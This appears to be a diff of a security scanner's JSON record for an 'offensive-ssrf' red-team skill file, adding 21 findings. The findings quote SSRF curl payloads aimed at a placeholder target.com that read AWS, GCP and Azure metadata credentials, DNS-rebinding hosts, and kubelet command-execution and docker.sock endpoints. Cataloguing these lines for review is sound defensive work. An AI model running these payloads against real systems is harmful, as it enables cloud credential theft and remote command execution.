@@ -4,30 +4,242 @@
   "repo": "CYBER-THREAT-INTELLIGENCE-REPORT",
   "path": "AI-Red-Team/open-red-team/skills/web/offensive-ssrf",
   "name": "offensive-ssrf",
-  "description": "",
-  "stars": 86,
+  "description": "Server-Side Request Forgery testing checklist: SSRF discovery, blind SSRF with out-of-band, cloud metadata endpoints (AWS/GCP/Azure), SSRF filter bypass techniques (IP encoding, DNS rebinding,…",
+  "stars": 88,
   "category": "security",
-  "commit": "9768969930181ed6f9ef9ff21abf43d3f0be1dd8",
+  "commit": "63ecb7d73cf5303fd2540a7abc732c1e23d814cb",
   "contentHash": "b18c33259e1a49aef97bcc5b4a9324df5fec075184392a6cc0b81cfdb39aa6e6",
   "repoCreatedAt": "2026-03-20T05:36:52Z",
   "alsoFoundIn": [],
   "status": "ok",
-  "incomplete": true,
-  "scannedAt": "2026-11-23T11:25:12.649Z",
+  "incomplete": false,
+  "scannedAt": "2026-11-27T11:31:01.147Z",
   "scan": {
-    "findings": [],
-    "findingTotals": {},
-    "score": 100,
+    "findings": [
+      {
+        "ruleId": "network",
+        "file": "AI-Red-Team/open-red-team/skills/web/offensive-ssrf/SKILL.md",
+        "line": 548,
+        "excerpt": "curl -s \"https://target.com/api?url=http://localhost:$port\" -o /dev/null",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "target.com"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "AI-Red-Team/open-red-team/skills/web/offensive-ssrf/SKILL.md",
+        "line": 558,
+        "excerpt": "curl -s -X PUT \"https://target.com/api?url=http://169.254.169.254/latest/api/token\" -H \"X-aws-ec2-metadata-token-ttl-seconds: 21600\"",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "target.com",
+          "169.254.169.254"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "AI-Red-Team/open-red-team/skills/web/offensive-ssrf/SKILL.md",
+        "line": 560,
+        "excerpt": "curl -s \"https://target.com/api?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE\" -H \"X-aws-ec2-metadata-token: TOKEN\"",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "target.com",
+          "169.254.169.254"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "AI-Red-Team/open-red-team/skills/web/offensive-ssrf/SKILL.md",
+        "line": 562,
+        "excerpt": "curl -s \"https://target.com/api?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME\"",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "target.com",
+          "169.254.169.254"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "AI-Red-Team/open-red-team/skills/web/offensive-ssrf/SKILL.md",
+        "line": 565,
+        "excerpt": "curl -s \"https://target.com/api?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token\" -H \"Metadata-Flavor: Google\"",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "target.com",
+          "metadata.google.internal"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "AI-Red-Team/open-red-team/skills/web/offensive-ssrf/SKILL.md",
+        "line": 568,
+        "excerpt": "curl -s \"https://target.com/api?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01\" -H \"Metadata: true\"",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "target.com",
+          "169.254.169.254"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "AI-Red-Team/open-red-team/skills/web/offensive-ssrf/SKILL.md",
+        "line": 621,
+        "excerpt": "curl http://make-1.2.3.4-127.0.0.1-rbndr.us",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "make-1.2.3.4-127.0.0.1-rbndr.us"
+        ]
+      },
+      {
+        "ruleId": "shell",
+        "file": "AI-Red-Team/open-red-team/skills/web/offensive-ssrf/SKILL.md",
+        "line": 621,
+        "excerpt": "curl http://make-1.2.3.4-127.0.0.1-rbndr.us",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "AI-Red-Team/open-red-team/skills/web/offensive-ssrf/SKILL.md",
+        "line": 624,
+        "excerpt": "curl http://1u.ms/A-127.0.0.1:1-2  # Alternates between external and localhost",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "1u.ms"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "AI-Red-Team/open-red-team/skills/web/offensive-ssrf/SKILL.md",
+        "line": 649,
+        "excerpt": "curl http://127.0.0.1:10250/pods        # List all pods on node",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": []
+      },
+      {
+        "ruleId": "shell",
+        "file": "AI-Red-Team/open-red-team/skills/web/offensive-ssrf/SKILL.md",
+        "line": 649,
+        "excerpt": "curl http://127.0.0.1:10250/pods        # List all pods on node",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "AI-Red-Team/open-red-team/skills/web/offensive-ssrf/SKILL.md",
+        "line": 650,
+        "excerpt": "curl http://127.0.0.1:10250/run/<namespace>/<pod>/<container> -d \"cmd=id\"  # Execute commands",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": []
+      },
+      {
+        "ruleId": "network",
+        "file": "AI-Red-Team/open-red-team/skills/web/offensive-ssrf/SKILL.md",
+        "line": 651,
+        "excerpt": "curl http://127.0.0.1:10255/pods        # Read-only port (legacy, often still open)",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": []
+      },
+      {
+        "ruleId": "network",
+        "file": "AI-Red-Team/open-red-team/skills/web/offensive-ssrf/SKILL.md",
+        "line": 660,
+        "excerpt": "curl -H \"Authorization: Bearer $TOKEN\" \\",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": []
+      },
+      {
+        "ruleId": "network",
+        "file": "AI-Red-Team/open-red-team/skills/web/offensive-ssrf/SKILL.md",
+        "line": 664,
+        "excerpt": "curl -H \"Authorization: Bearer $TOKEN\" \\",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": []
+      },
+      {
+        "ruleId": "shell",
+        "file": "AI-Red-Team/open-red-team/skills/web/offensive-ssrf/SKILL.md",
+        "line": 674,
+        "excerpt": "http://127.0.0.1:15000/config_dump      # Full mesh configuration, certificates, endpoints",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "AI-Red-Team/open-red-team/skills/web/offensive-ssrf/SKILL.md",
+        "line": 689,
+        "excerpt": "http://127.0.0.1:4191/metrics           # Prometheus metrics (leaks service topology)",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "AI-Red-Team/open-red-team/skills/web/offensive-ssrf/SKILL.md",
+        "line": 697,
+        "excerpt": "http://127.0.0.1:8500/v1/agent/self     # Agent configuration",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "AI-Red-Team/open-red-team/skills/web/offensive-ssrf/SKILL.md",
+        "line": 706,
+        "excerpt": "unix:///var/run/docker.sock",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "AI-Red-Team/open-red-team/skills/web/offensive-ssrf/SKILL.md",
+        "line": 725,
+        "excerpt": "http://169.254.170.2/v2/metadata        # Task metadata",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "AI-Red-Team/open-red-team/skills/web/offensive-ssrf/SKILL.md",
+        "line": 743,
+        "excerpt": "http://kubernetes-dashboard.kube-system.svc.cluster.local",
+        "disclosed": false,
+        "automatic": false
+      }
+    ],
+    "findingTotals": {
+      "network": 13,
+      "shell": 8
+    },
+    "score": 92,
     "band": "low",
     "rulesVersion": "1.3.0",
-    "filesScanned": 0,
-    "filesSkipped": 1
+    "filesScanned": 1,
+    "filesSkipped": 0
   },
   "history": [
     {
       "commit": "9768969930181ed6f9ef9ff21abf43d3f0be1dd8",
       "scannedAt": "2026-11-23T11:25:12.649Z",
       "score": 100,
+      "rulesVersion": "1.3.0"
+    },
+    {
+      "commit": "63ecb7d73cf5303fd2540a7abc732c1e23d814cb",
+      "scannedAt": "2026-11-27T11:31:01.147Z",
+      "score": 92,
       "rulesVersion": "1.3.0"
     }
   ]
